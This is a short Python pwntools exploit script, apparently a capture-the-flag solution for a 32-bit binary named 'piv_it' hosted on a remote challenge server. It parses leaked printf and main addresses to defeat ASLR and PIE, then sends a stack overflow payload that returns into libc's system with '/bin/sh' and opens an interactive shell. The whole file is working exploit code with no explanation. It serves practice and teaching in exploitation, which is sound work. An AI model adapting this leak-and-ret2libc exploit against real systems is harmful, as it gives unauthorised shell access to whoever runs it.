#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

from pwn import *

# p = process("./piv_it")
p = remote("plsdonthaq.me", 8002)

addr = dict()
offsets = dict(
    printf = 0x512d0,
    system = 0x3d200,
    main = 0x725,
    binsh = 0x17e0cf
)

# '''
# 1) read(0, &var_a8, 0x80)
# 2) read(0, &var_20, 0x38)
# '''

# Leak libc base
p.recvuntil("Unexpected Error Encountered At: ")
addr["libc_base"] = int(p.recvline(), 16) - offsets["printf"]
log.info(f"libc base leaked at {hex(addr['libc_base'])}")

# Send payload
p.sendlineafter("Manual Override Initiated\n\n$ ", "")

# Leak program base
p.recvuntil("Unexpected Error Encountered At: ")
addr["base"] = int(p.recvline(), 16) - offsets["main"]
log.info(f"Program base leaked at {hex(addr['base'])}")

# 0x38 
payload = b''
payload += b'\00' * 0x20
payload += p32(addr['libc_base'] + offsets["system"]) 
payload += b'....'
payload += p32(addr['libc_base'] + offsets["binsh"])
p.sendlineafter("Safe Mode Enabled\n\n$ ", payload)

p.recvuntil("Failed to execute command: ")
log.critical("PWN!")
p.interactive()
